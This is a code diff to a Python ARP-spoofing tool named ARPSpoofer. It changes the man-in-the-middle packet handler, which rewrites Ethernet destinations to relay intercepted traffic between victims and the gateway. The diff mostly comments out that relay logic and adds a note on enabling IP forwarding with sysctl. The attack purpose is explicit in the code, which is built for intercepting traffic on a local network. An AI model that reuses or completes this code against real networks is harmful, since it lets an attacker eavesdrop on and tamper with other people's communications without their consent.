@@ -125,27 +125,28 @@ class ARPSpoofer:
             time.sleep(2)
 
     def mitm_packet_handler(self, pkt):
+        # sudo sysctl net.inet.ip.forwarding=1
         if pkt.haslayer(IP) and pkt.haslayer(Ether) and pkt[Ether].dst == self.host_mac and pkt[IP].dst != self.host_ip:
-            print()
+            # print()
             print(f"Packet recieved {pkt.summary()}")
-            client = None
-            for spoofed_clients in self.spoofing_clients:
-                if spoofed_clients['original_IP'] == pkt[IP].dst:
-                    client = spoofed_clients
-            if client != None:
-                if client['attack_type'] == 'mitm':
-                    print(f"From gateway, Macs are src: {pkt[Ether].src} {pkt[Ether].dst}")
-                    pkt[Ether].dst = client['original_MAC']
-                    del pkt[Ether].chksum
-                    print(f"Sending packet {pkt.summary()}, {pkt[Ether].src} {pkt[Ether].dst}")
-                    # pkt[IP].src = '100.100.100.100'
-                    sendp(pkt, verbose=False)
-            else:
-                print(f"From target, Macs are src: {pkt[Ether].src} {pkt[Ether].dst}")
-                pkt[Ether].dst = self.gateway_mac
-                del pkt[Ether].chksum
-                print(f"Sending packet {pkt.summary()}, {pkt[Ether].src} {pkt[Ether].dst}")
-                sendp(pkt, verbose=False)
+            # client = None
+            # for spoofed_clients in self.spoofing_clients:
+            #     if spoofed_clients['original_IP'] == pkt[IP].dst:
+            #         client = spoofed_clients
+            # if client != None:
+            #     if client['attack_type'] == 'mitm':
+            #         print(f"From gateway, Macs are src: {pkt[Ether].src} {pkt[Ether].dst}")
+            #         pkt[Ether].dst = client['original_MAC']
+            #         del pkt[Ether].chksum
+            #         print(f"Sending packet {pkt.summary()}, {pkt[Ether].src} {pkt[Ether].dst}")
+            #         # pkt[IP].src = '100.100.100.100'
+            #         sendp(pkt, verbose=False)
+            # else:
+            #     print(f"From target, Macs are src: {pkt[Ether].src} {pkt[Ether].dst}")
+            #     pkt[Ether].dst = self.gateway_mac
+            #     del pkt[Ether].chksum
+            #     print(f"Sending packet {pkt.summary()}, {pkt[Ether].src} {pkt[Ether].dst}")
+            #     sendp(pkt, verbose=False)
             
 
     def mitm_func(self):
